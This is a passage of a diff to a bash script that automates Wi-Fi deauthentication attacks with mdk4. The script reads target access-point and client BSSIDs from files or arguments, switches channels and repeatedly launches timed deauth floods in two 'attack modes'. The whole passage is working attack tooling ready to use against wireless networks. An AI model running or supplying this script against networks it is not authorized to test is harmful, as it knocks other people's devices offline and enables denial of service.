+    if [ -n "${BSSID_FILE}" ]; then
+        while IFS=',' read -r bssid channel; do
+            # Skip empty lines
+            if [ -z "${bssid}" ] || [ -z "${channel}" ]; then
+                continue
+            fi
+            # Validate the channel
+            validate_bssid "${bssid}"
+        done < "${BSSID_FILE}"
+    validate_channel_range "${channel}"
+    fi
+}
+
+sta_file_channel_check() {
+    # Check if STATION BSSID file is provided
+    if [ -n "${STATION_BSSID_FILE}" ]; then
+        while IFS=',' read -r station_bssid channel; do
+            # Skip empty lines
+            if [ -z "${station_bssid}" ] || [ -z "${channel}" ]; then
+                continue
+            fi
+            # Validate the channel
+            validate_bssid "${station_bssid}"
+        done < "${STATION_BSSID_FILE}"
+    validate_channel_range "${channel}"
+    fi
+}
+
+# Perform channel checks
+bssid_file_channel_check
+sta_file_channel_check
+
+# Newly added
+if [ -n "${BSSID_FILE}" ]; then
+    BSSIDS=($(awk -F"," '{print $1}' "${BSSID_FILE}"))
+    CHANNELS=($(awk -F"," '{print $2}' "${BSSID_FILE}"))
+elif [ -n "${STATION_BSSID_FILE}" ]; then
+    STATION_BSSIDS=($(awk -F"," '{print $1}' "${STATION_BSSID_FILE}"))
+    STATION_CHANNELS=($(awk -F"," '{print $2}' "${STATION_BSSID_FILE}"))
+elif [ -n "$BSSID" ]; then
+    BSSIDS=("$BSSID")
+    CHANNELS=("$CHAN")
+elif [ -n "$STATION" ]; then
+    STATION_BSSIDS=("$STATION")
+    STATION_CHANNELS=("$CHAN")
+fi
+
+# Pretty ATK Mode
+prettymode() {
+
+if [ "${ATTACK_MODE}" = 1 ]; then
+    PATTACKMODE="1 - Single Target Full Repeats"
+elif [ "${ATTACK_MODE}" = 2 ]; then
+    PATTACKMODE="2 - All Target Full Repeats"
+fi
+}
+
+# Call
+prettymode
+
+
+if [ -n "${BSSID}" ] || [ -n "${BSSID_FILE}" ]; then
+    first_iteration=true
+
+    if [ "$ATTACK_MODE" -eq 1 ]; then
+        # Mode 1: Attack each target X times before moving to the next
+        for ((i=0; i<${#BSSIDS[@]}; i++)); do
+            if [ "$first_iteration" = true ]; then
+                echo "Starting mdk4 in ${LOOP_START_DELAY} seconds with the following options."
+                echo "------------------------------"
+                for ((j=0; j<${#BSSIDS[@]}; j++)); do
+                    echo "Target: ${BSSIDS[$j]}"
+                    echo "Channel: ${CHANNELS[$j]}"
+                    echo
+                done
+                echo "Interface: ${INTERFACE}"
+                echo "Attack Duration: ${DURATION_SECONDS}s"
+                echo "Attack Mode: ${PATTACKMODE}"
+                echo "Time To Wait: ${WAIT_SECONDS}s"
+                echo "Packet Speed: ${PACKET_SPEED}/s"
+                echo "Repeats: $((REPEATS))"
+                echo "------------------------------"
+                echo
+                sleep "${LOOP_START_DELAY}"
+                first_iteration=false
+            fi
+
+            for ((j=0; j<$REPEATS; j++)); do
+                echo "Starting Attack $((j+1)) of ${REPEATS}"
+                echo "------------------------------"
+                echo "Target: ${BSSIDS[$i]}"
+                echo "Channel: ${CHANNELS[$i]}"
+                echo "------------------------------"
+                echo
+
+                iwconfig "${INTERFACE}" channel "${CHANNELS[$i]}"
+                sleep 1
+                mdk4 ${INTERFACE} d -B "${BSSIDS[$i]}" -c "${CHAN:-${CHANNELS[$i]}}" -s "${PACKET_SPEED}" &
+                mdk4_pid=$!
+                sleep "${DURATION_SECONDS}"
+                kill -TERM ${mdk4_pid} 2>/dev/null
+                echo "MDK4 process killed successfully."
+
+                if [ $j -lt $((REPEATS-1)) ]; then
+                    echo "Entering recurring delay of ${WAIT_SECONDS}s"
+                    sleep "${WAIT_SECONDS}"
+                else
+                    echo "Completed All Repeats."
+                fi
+            done
+        done
+
+    elif [ "$ATTACK_MODE" -eq 2 ]; then
+        # Mode 2: Attack all targets once per cycle, then repeat
+        for ((j=0; j<$REPEATS; j++)); do
+            if [ "$first_iteration" = true ]; then
+                echo "Starting mdk4 in ${LOOP_START_DELAY} seconds with the following options."
+                echo "------------------------------"
+                for ((i=0; i<${#BSSIDS[@]}; i++)); do
+                    echo "Target: ${BSSIDS[$i]}"
+                    echo "Channel: ${CHANNELS[$i]}"
+                    echo
+                done
+                echo "Interface: ${INTERFACE}"
+                echo "Attack Duration: ${DURATION_SECONDS}s"
+                echo "Attack Mode: ${PATTACKMODE}"
+                echo "Time To Wait: ${WAIT_SECONDS}s"
+                echo "Packet Speed: ${PACKET_SPEED}/s"
+                echo "Repeats: $((REPEATS))"
+                echo "------------------------------"
+                echo
+                sleep "${LOOP_START_DELAY}"
+                first_iteration=false
+            fi
+
+            for ((i=0; i<${#BSSIDS[@]}; i++)); do
+                echo "Starting Attack Cycle $((j+1)) of ${REPEATS}"
+                echo "------------------------------"
+                echo "Target: ${BSSIDS[$i]}"
+                echo "Channel: ${CHANNELS[$i]}"
+                echo "------------------------------"
+                echo
+
+                iwconfig "${INTERFACE}" channel "${CHANNELS[$i]}"
+                sleep 1
+                mdk4 ${INTERFACE} d -B "${BSSIDS[$i]}" -c "${CHAN:-${CHANNELS[$i]}}" -s "${PACKET_SPEED}" &
+                mdk4_pid=$!
+                sleep "${DURATION_SECONDS}"
+                kill -TERM ${mdk4_pid} 2>/dev/null
+                echo "MDK4 process killed successfully."
+                echo
+            done
+
+            if [ $j -lt $((REPEATS-1)) ]; then
+                echo "Entering recurring delay of ${WAIT_SECONDS}s"
+                sleep "${WAIT_SECONDS}"
+            else
+                echo "Completed All Repeats."
+            fi
+        done
     fi
 fi
 
-if [ -z "$BSSID" ] && [ -z "$BSSID_FILE" ] && [ -z "$STATION" ] && [ -z "$STATION_BSSID_FILE" ]; then
-    show_help
-    exit 1
-fi
-
-if [ -n "$BSSID" ] || [ -n "$BSSID_FILE" ]; then
+if [ -n "${STATION}" ] || [ -n "${STATION_BSSID_FILE}" ]; then
     first_iteration=true
-    for ((i=0; i<${#BSSIDS[@]}; i++)); do
-        if [ "$first_iteration" = true ]; then
-            # Initial message for the first iteration
-            echo "Starting mdk4 in 10 seconds with the following options."
-            echo "------------------------------"
-            for ((j=0; j<${#BSSIDS[@]}; j++)); do
-                echo "Target: ${BSSIDS[$j]}"
-                echo "Channel: ${CHANNELS[$j]}"
-                echo
-            done
-            echo "Interface: ${IFACE}"
-            echo "Attack Duration: ${DURATION_SECONDS}s"
-            echo "Time To Wait: ${WAIT_SECONDS}s"
-            echo "Packet Speed: ${PACKET_SPEED}/s"
-            echo "Repeats: $((REPEATS))"
-            echo "------------------------------"
-            echo
-            sleep 10
-            first_iteration=false
-        fi
 
+    if [ "$ATTACK_MODE" -eq 1 ]; then
+        # Mode 1: Attack each station X times before moving to the next
+        for ((i=0; i<${#STATION_BSSIDS[@]}; i++)); do
+            if [ "$first_iteration" = true ]; then
+                echo "Starting mdk4 in ${LOOP_START_DELAY} seconds with the following options."
+                echo "------------------------------"
+                for ((j=0; j<${#STATION_BSSIDS[@]}; j++)); do
+                    echo "Target: ${STATION_BSSIDS[$j]}"
+                    echo "Channel: ${STATION_CHANNELS[$j]}"
+                    echo
+                done
+                echo "Interface: ${INTERFACE}"
+                echo "Attack Duration: ${DURATION_SECONDS}s"
+                echo "Attack Mode: ${PATTACKMODE}"
+                echo "Time To Wait: ${WAIT_SECONDS}s"
+                echo "Packet Speed: ${PACKET_SPEED}/s"
+                echo "Repeats: $((REPEATS))"
+                echo "------------------------------"
+                echo
+                sleep "${LOOP_START_DELAY}"
+                first_iteration=false
+            fi
+
+            for ((j=0; j<$REPEATS; j++)); do
+                echo "Starting Attack $((j+1)) of ${REPEATS}"
+                echo "------------------------------"
+                echo "Target: ${STATION_BSSIDS[$i]}"
+                echo "Channel: ${STATION_CHANNELS[$i]}"
+                echo "------------------------------"
+                echo
+
+                iwconfig "${INTERFACE}" channel "${STATION_CHANNELS[$i]}"
+                sleep 1
+                mdk4 ${INTERFACE} d -S "${STATION_BSSIDS[$i]}" -c "${CHAN:-${STATION_CHANNELS[$i]}}" -s "${PACKET_SPEED}" &
+                mdk4_pid=$!
+                sleep "${DURATION_SECONDS}"
+                kill -TERM ${mdk4_pid} 2>/dev/null
+                echo "MDK4 process killed successfully."
+                echo
+
+                if [ $j -lt $((REPEATS-1)) ]; then
+                    echo "Entering recurring delay of ${WAIT_SECONDS}s"
+                    sleep "${WAIT_SECONDS}"
+                else
+                    echo "Completed All Repeats."
+                fi
+            done
+        done
+
+    elif [ "$ATTACK_MODE" -eq 2 ]; then
+        # Mode 2: Attack all stations once per cycle, then repeat
         for ((j=0; j<$REPEATS; j++)); do
-            echo "Starting Attack $((j+1)) of ${REPEATS}"
-            echo "------------------------------"
-            echo "Target: ${BSSIDS[$i]}"
-            echo "Channel: ${CHANNELS[$i]}"
-            echo "------------------------------"
-            echo
-            mdk4 ${IFACE} d -B "${BSSIDS[$i]}" -c "${CHAN:-${CHANNELS[$i]}}" -s "${PACKET_SPEED}" &
-            mdk4_pid=$!
-            sleep "${DURATION_SECONDS}"
-            echo
-            echo "Stopped mdk4 instance."
-            kill -TERM ${mdk4_pid} 2>/dev/null
-            echo "MDK4 process killed successfully."
+            if [ "$first_iteration" = true ]; then
+                echo "Starting mdk4 in ${LOOP_START_DELAY} seconds with the following options."
+                echo "------------------------------"
+                for ((i=0; i<${#STATION_BSSIDS[@]}; i++)); do
+                    echo "Target: ${STATION_BSSIDS[$i]}"
+                    echo "Channel: ${STATION_CHANNELS[$i]}"
+                    echo
+                done
+                echo "Interface: ${INTERFACE}"
+                echo "Attack Duration: ${DURATION_SECONDS}s"
+                echo "Attack Mode: ${PATTACKMODE}"
+                echo "Time To Wait: ${WAIT_SECONDS}s"
+                echo "Packet Speed: ${PACKET_SPEED}/s"
+                echo "Repeats: $((REPEATS))"
+                echo "------------------------------"
+                echo
+                sleep "${LOOP_START_DELAY}"
+                first_iteration=false
+            fi
+
+            for ((i=0; i<${#STATION_BSSIDS[@]}; i++)); do
+                echo "Starting Attack Cycle $((j+1)) of ${REPEATS}"
+                echo "------------------------------"
+                echo "Target: ${STATION_BSSIDS[$i]}"
+                echo "Channel: ${STATION_CHANNELS[$i]}"
+                echo "------------------------------"
+                echo
+
+                iwconfig "${INTERFACE}" channel "${STATION_CHANNELS[$i]}"
+                sleep 1
+                mdk4 ${INTERFACE} d -S "${STATION_BSSIDS[$i]}" -c "${CHAN:-${STATION_CHANNELS[$i]}}" -s "${PACKET_SPEED}" &
+                mdk4_pid=$!
+                sleep "${DURATION_SECONDS}"
+                kill -TERM ${mdk4_pid} 2>/dev/null
+                echo "MDK4 process killed successfully."
+            done
 
             if [ $j -lt $((REPEATS-1)) ]; then
-                echo
                 echo "Entering recurring delay of ${WAIT_SECONDS}s"
                 sleep "${WAIT_SECONDS}"
             else
                 echo "Completed All Repeats."
             fi
         done
-    done
-fi
-
-if [ -n "$STATION" ] || [ -n "$STATION_BSSID_FILE" ]; then
-    first_iteration=true
-    for ((i=0; i<${#STATION_BSSIDS[@]}; i++)); do
-        if [ "$first_iteration" = true ]; then
-            # Initial message for the first iteration
-            echo "Starting mdk4 in 10 seconds with the following options."
-            echo "------------------------------"
-            for ((j=0; j<${#STATION_BSSIDS[@]}; j++)); do
-                echo "Target: ${STATION_BSSIDS[$j]}"
-                echo "Channel: ${STATION_CHANNELS[$j]}"
-            done
-            echo "Interface: ${IFACE}"
-            echo "Attack Duration: ${DURATION_SECONDS}s"
-            echo "Time To Wait: ${WAIT_SECONDS}s"
-            echo "Packet Speed: ${PACKET_SPEED}/s"
-            echo "Repeats: $((REPEATS))"
-            echo "------------------------------"
-            echo
-            sleep 10
-            first_iteration=false
-        fi
-
-        for ((j=0; j<$REPEATS; j++)); do
-            echo "Starting Attack $((j+1)) of ${REPEATS}"
-            echo "------------------------------"
-            echo "Target: ${STATION_BSSIDS[$i]}"
-            echo "Channel: ${STATION_CHANNELS[$i]}"
-            echo "------------------------------"
-            echo
-            mdk4 ${IFACE} d -S "${STATION_BSSIDS[$i]}" -c "${CHAN:-${STATION_CHANNELS[$i]}}" -s "${PACKET_SPEED}" &
-            mdk4_pid=$!
-            sleep "${DURATION_SECONDS}"
-            echo
-            echo "Stopped mdk4 instance."
-            kill -TERM ${mdk4_pid} 2>/dev/null
-            echo "MDK4 process killed successfully."
-
-            if [ $j -lt $((REPEATS-1)) ]; then
-                echo
-                echo "Entering recurring delay of ${WAIT_SECONDS}s"
-                sleep "${WAIT_SECONDS}"
-            else
-                echo "Completed All Repeats."
-            fi
-        done
-    done
+    fi
 fi
